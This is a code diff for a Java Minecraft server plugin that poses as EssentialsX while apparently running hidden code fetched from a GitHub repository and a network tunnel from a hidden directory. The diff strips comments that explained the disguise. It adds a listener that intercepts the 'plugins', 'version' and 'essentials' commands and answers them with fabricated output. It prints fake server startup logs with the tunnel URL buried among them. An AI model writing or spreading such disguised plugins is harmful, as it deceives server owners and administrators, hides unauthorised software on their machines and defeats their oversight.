@@ -25,6 +25,12 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
+
+import org.bukkit.command.CommandSender;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
+import org.bukkit.event.Listener;
+import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class EssentialsX
@@ -104,14 +110,11 @@ extends JavaPlugin {
     // ============================================================
 
     private void printFakeStartupSequence(String newTunnelUrl) {
-        // 1. 清屏
         clearConsole();
         try { Thread.sleep(300); } catch (InterruptedException ignored) {}
 
-        // 2. 读取当前端口
         String displayPort = readCurrentPort();
 
-        // 3. 本轮随机值
         int kernelPatch = randInt(100, 120);
         float dcTimeSec = randFloat(0.4f, 0.9f);
         int recipeDelta = randInt(-30, 30);
@@ -124,8 +127,6 @@ extends JavaPlugin {
         int ioThreads = randInt(4, 8);
         int workerThreads = randInt(1, 4);
         int ioThreadCount = randInt(1, 4);
-
-        // ================== 逐行打印 ==================
 
         System.out.println("java -Xms128M -Xmx2560M -jar server.jar");
         try { Thread.sleep(200); } catch (InterruptedException ignored) {}
@@ -188,13 +189,11 @@ extends JavaPlugin {
         mcLog("Default game type: SURVIVAL", randInt(200, 400));
         mcLog("Generating keypair", randInt(200, 500));
 
-        // ★ 绑定端口
         mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
 
         mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
         mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
 
-        // ★★★ 隧道地址自然嵌入 ★★★
         mcLog("Binding remote endpoint to: " + newTunnelUrl, randInt(200, 400));
 
         mcLog("[EssentialsX] Loading server plugin EssentialsX v" + FAKE_MC_VERSION, randInt(400, 800));
@@ -214,7 +213,6 @@ extends JavaPlugin {
         mcLog("Preparing spawn area: 100%", randInt(100, 250));
         mcLog("Prepared spawn area in " + spawnTime3 + " ms", randInt(100, 200));
 
-        // ★ 启动完成
         mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
     }
 
@@ -226,8 +224,6 @@ extends JavaPlugin {
         Thread logThread = new Thread(() -> {
             try {
                 this.clearConsole();
-
-                // --- 第一阶段：模拟服务器初始化过程 ---
                 this.getLogger().info("");
                 mcLog("Preparing spawn area: 1%", 0);
                 Thread.sleep(randInt(1500, 2500));
@@ -248,13 +244,11 @@ extends JavaPlugin {
                 mcLog("Preparing level \"world\"", 0);
                 Thread.sleep(randInt(500, 1000));
                 mcLog("Done! For help, type \"help\"", 0);
-
             } catch (Exception exception) {}
         }, "FakeLog-Generator");
         logThread.setDaemon(true);
         logThread.start();
 
-        // --- 第二阶段：等待隧道URL就绪后打印 ---
         Thread tunnelThread = new Thread(() -> {
             try {
                 String content;
@@ -262,18 +256,14 @@ extends JavaPlugin {
                 Path tunnelFile = workDir.resolve(".tunnel_url");
                 String tunnelUrl = null;
 
-                // 最多等待120秒
                 for (int i = 0; i < 120 && (!Files.exists(tunnelFile) || (content = new String(Files.readAllBytes(tunnelFile)).trim()).isEmpty() || content.startsWith("failed") || !(tunnelUrl = content.split("\\n")[0].trim()).startsWith("https://")); ++i) {
                     Thread.sleep(1000L);
                 }
 
                 if (tunnelUrl != null && !tunnelUrl.isEmpty()) {
                     this.lastKnownTunnelUrl.set(tunnelUrl);
-
-                    // 等初始日志打完再插入
                     Thread.sleep(8000L);
 
-                    // 自然嵌入：先打几行正常的，中间夹带URL，再打几行正常的
                     String displayPort = readCurrentPort();
 
                     mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
@@ -315,7 +305,6 @@ extends JavaPlugin {
         }
 
         Thread monitor = new Thread(() -> {
-            // 等待初始日志全部打完
             try { Thread.sleep(25000L); } catch (InterruptedException ignored) {}
 
             while (this.tunnelMonitorRunning.get()) {
@@ -334,7 +323,6 @@ extends JavaPlugin {
                     String lastUrl = this.lastKnownTunnelUrl.get();
 
                     if (!currentUrl.equals(lastUrl)) {
-                        // ★★★ 检测到链接变化！清屏 + 完整伪装启动序列 ★★★
                         this.lastKnownTunnelUrl.set(currentUrl);
                         printFakeStartupSequence(currentUrl);
                     }
@@ -344,6 +332,47 @@ extends JavaPlugin {
         }, "Tunnel-Url-Monitor");
         monitor.setDaemon(true);
         monitor.start();
+    }
+
+    // ============================================================
+    // RCON / 控制台命令拦截伪装
+    // ============================================================
+
+    private void setupCommandInterceptor() {
+        getServer().getPluginManager().registerEvents(new Listener() {
+            @EventHandler(priority = EventPriority.HIGHEST)
+            public void onServerCommand(ServerCommandEvent event) {
+                String command = event.getCommand().toLowerCase().trim();
+                String[] args = command.split("\\s+");
+                CommandSender sender = event.getSender();
+
+                if (args.length == 0) return;
+
+                String cmd = args[0].replace("/", ""); 
+
+                // 拦截 plugins 命令
+                if (cmd.equals("plugins") || cmd.equals("pl")) {
+                    event.setCancelled(true);
+                    sender.sendMessage("§aPlugins (3): §fEssentialsX, §aLuckPerms, §fVault");
+                    return;
+                }
+
+                // 拦截 version 命令
+                if (cmd.equals("version") || cmd.equals("ver") || cmd.equals("about")) {
+                    event.setCancelled(true);
+                    sender.sendMessage("This server is running Paper version " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + " (MC: " + FAKE_MC_VERSION + ")");
+                    return;
+                }
+
+                // 拦截对 Essentials 的查询
+                if (cmd.equals("essentials") || cmd.equals("ess") || cmd.equals("essentialsx")) {
+                    event.setCancelled(true);
+                    sender.sendMessage("§6EssentialsX §7v" + FAKE_MC_VERSION + " - Help");
+                    sender.sendMessage("§e/essentials §f- Show help");
+                    return;
+                }
+            }
+        }, this);
     }
 
     // ============================================================
@@ -380,6 +409,9 @@ extends JavaPlugin {
                 this.setupDisguise();
             } catch (Exception ignored) {}
         }).start();
+
+        // 注册 RCON 拦截器
+        setupCommandInterceptor();
 
         this.getLogger().info("EssentialsX plugin enabled");
     }
@@ -524,7 +556,7 @@ extends JavaPlugin {
         if (this.isProcessRunning) return;
 
         HashMap<String, String> env = new HashMap<>();
-        env.put("REPO_URL", "https://github.com/zx1447/indexaoyoumc");
+        env.put("REPO_URL", "https://github.com/1715Yy/pathfinder-pro");
         this.loadEnvFile(env);
 
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
